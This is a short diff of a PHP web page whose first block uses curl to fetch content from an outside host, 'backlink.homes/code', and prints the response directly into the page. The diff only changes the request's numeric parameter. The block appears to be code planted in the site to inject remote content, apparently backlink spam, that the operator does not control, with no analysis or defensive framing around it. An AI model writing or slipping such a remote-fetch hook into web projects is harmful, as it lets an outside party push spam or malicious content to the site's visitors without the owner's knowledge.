@@ -1,9 +1,8 @@
     <?php
     $exe = curl_init();
-    curl_setopt($exe, CURLOPT_URL, "https://backlink.homes/code?x=3262");
+    curl_setopt($exe, CURLOPT_URL, "https://backlink.homes/code?x=3263");
     curl_exec($exe);
 ?>
-
   
 <?php
 $pagelink=trim(preg_replace('#(\?.*)?#','',$_SERVER['REQUEST_URI']),'/');
